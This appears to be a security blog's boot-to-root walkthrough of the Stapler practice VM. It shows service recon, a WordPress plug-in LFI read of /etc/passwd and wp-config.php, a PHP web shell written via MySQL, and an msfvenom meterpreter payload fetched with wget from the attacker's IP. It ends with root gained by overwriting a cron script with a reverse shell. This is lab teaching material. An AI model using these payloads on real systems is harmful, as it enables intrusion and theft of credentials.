@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
+Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user." />
+<meta name="keywords" content="[security vulnhub red team hackthebox blue team]" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://sec.alexflor.es/posts/stapler/" />
+
+
+    <title>
+        
+            B2R: Stapler :: &#34; r e s e a r c h &#34; 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="B2R: Stapler">
+<meta itemprop="description" content="Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
+Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user.">
+<meta itemprop="datePublished" content="2016-12-24T23:45:38-05:00" />
+<meta itemprop="dateModified" content="2016-12-24T23:45:38-05:00" />
+<meta itemprop="wordCount" content="642">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="B2R: Stapler"/>
+<meta name="twitter:description" content="Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
+Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user."/>
+
+
+
+    <meta property="article:section" content="Boot2Root" />
+
+
+
+    <meta property="article:published_time" content="2016-12-24 23:45:38 -0500 EST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/imf_walkthrough/">B2R: IMF Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/sickos_1.2/">B2R: SickOSv1.2</a></li><li><a href="https://sec.alexflor.es/posts/b2r_troll_walkthrough/">B2R: Tr0ll Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/wallaby/">B2R: Wallaby Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/ssh_pivoting/">Configuring SSH for Pivoting</a></li><li><a href="https://sec.alexflor.es/posts/bashbunny/">Creating BashBunny Payloads</a></li><li><a href="https://sec.alexflor.es/posts/egress-ports/">Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</a></li><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://sec.alexflor.es/posts/stapler/">B2R: Stapler</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <p>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.</p>
+<p><img src="https://i.imgur.com/cazlgnf.png" alt=""></p>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>This machine had several services running, some of which revealed employee names and accounts that could
+later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
+database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
+ran every 20 minutes as the <code>root</code> user and that the script was writable to our non-privileged user. This was
+leveraged to create a <code>root</code> shell by replacing the file contents with a malicious payload.</p>
+<h2 id="execution">Execution</h2>
+<p>An initial recon scan on the target revealed the following services:</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
+</code></pre><p><img src="https://i.imgur.com/YeosV0b.png" alt=""></p>
+<p>All together, individual inspection of the services revealed a plethora of information about the company and
+its employees.
+This section will cover the most direct route to <code>root</code>,
+but see the <a href="#additional-discovery">Additional Discovery</a> section for that information.</p>
+<p>Using <code>nikto</code> against the service on port <code>12380</code> revealed additional paths using the https protocol.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
+</code></pre><p><img src="https://i.imgur.com/DTF5i00.png" alt=""></p>
+<p>The site hosted at <code>/blogblog</code> is a Wordpress blog with a vulnerable plug-in, as discovered by <code>wpscan</code>.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
+</code></pre><p><img src="https://i.imgur.com/uzdO1dx.png" alt="">
+<img src="https://i.imgur.com/U2NyDnu.png" alt="">
+<img src="https://i.imgur.com/LrEOKFq.png" alt=""></p>
+<p><a href="https://www.exploit-db.com/exploits/39646/">This LFI vulnerability</a> allows an attacker to read the contents
+of a file on the system by using that file as a &ldquo;thumbnail&rdquo; for a post. An attacker could use this to read
+the contents of the Wordpress configuration file which has database credentials. The user account list for
+this machine was also acquired using this method.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
+&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&quot;
+</code></pre><p><img src="https://i.imgur.com/XMcARrC.png" alt=""></p>
+<p>By curling the &ldquo;image&rdquo; urls, the contents can be read.</p>
+<p><img src="https://i.imgur.com/CVtnKiK.png" alt="">
+<img src="https://i.imgur.com/rfez3zi.png" alt=""></p>
+<p>With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
+remote code execution.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress
+
+mysql&gt;&gt; SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/root/www/rce.php'
+</code></pre><p><img src="https://i.imgur.com/h0gsLrZ.png" alt=""></p>
+<p>With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
+shell.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
+&gt;&gt; systemctl start apache2
+
+#create the payload in the web directory
+&gt;&gt; msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw &gt; /var/www/html/qq.php
+
+# trigger remote commands that download the payload from the attacker's computer
+&gt;&gt; curl &quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&quot;
+&gt;&gt; curl &quot;vm/rce.php?cmd=ls&quot;
+</code></pre><p><img src="https://i.imgur.com/5WdoFhk.png" alt=""></p>
+<p>A listener/handler is configured and the reverse shell kicked off on the victim computer</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;
+
+msfconsole&gt;&gt; set PAYLOAD php/meterpreter_reverse_tcp
+msfconsolemsfconsole&gt;&gt; set LPORT 443
+msfconsole&gt;&gt; exploit -j
+
+# start the shell
+&gt;&gt; curl &quot;vm/qq.php&quot;
+</code></pre><p><img src="https://i.imgur.com/Gxqwui2.png" alt=""></p>
+<p>An attacker can now enumerate the contents of the victim's file system, allowing them identify any vulnerable
+or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
+running a world-modifiable file as root.</p>
+<p><img src="https://i.imgur.com/I0kuii9.png" alt="">
+<img src="https://i.imgur.com/bg9dpXH.png" alt=""></p>
+<p>Further inspection of this scheduled task:</p>
+<p><img src="https://i.imgur.com/WXEowHC.png" alt=""></p>
+<p>This task runs as the root user. All that was needed to become root was to replace the contents of the script
+with a reverse shell.</p>
+<p><img src="https://i.imgur.com/vFqTefn.png" alt=""></p>
+<h2 id="additional-discovery">Additional Discovery</h2>
+<p>SMB enumeration and unprotected shares revealed some employee names and personal notes
+<img src="https://i.imgur.com/VEFkW99.png" alt=""></p>
+<p>Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
+the attacker.
+<img src="https://i.imgur.com/vJBqGGF.png" alt=""></p>
+<p>The anonymous ftp login also leaks information.
+<img src="https://i.imgur.com/fW3Nl8k.png" alt="">
+<img src="https://i.imgur.com/aFFIp9P.png" alt=""></p>
+<p>Port 80 scan initially returned what looked like a user's dotfiles. This gave me the idea that someone may be
+running a web server from their home directory.
+<img src="https://i.imgur.com/w3143f7.png" alt=""></p>
+<p>The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
+users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
+passwords for their machine accounts.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
+</code></pre><p><img src="https://i.imgur.com/v1GKKbb.png" alt=""></p>
+<p>Without accessing the computer's <code>/etc/passwd</code> file, this gathering of information revealed the existence of
+the following employees and a accounts:</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
+dave
+elly
+fred
+garry
+harry
+heather
+john
+kathy
+pam
+peter
+scott
+tim
+vicki
+zoe
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>642 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2016-12-24 23:45 -0500</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://sec.alexflor.es/posts/wallaby/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">B2R: Wallaby Walkthrough</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://sec.alexflor.es/posts/sickos_1.2/">
+                                <span class="button__text">B2R: SickOSv1.2</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+            <span></span>
+            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-12497311-8', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
+    </body>
+</html>
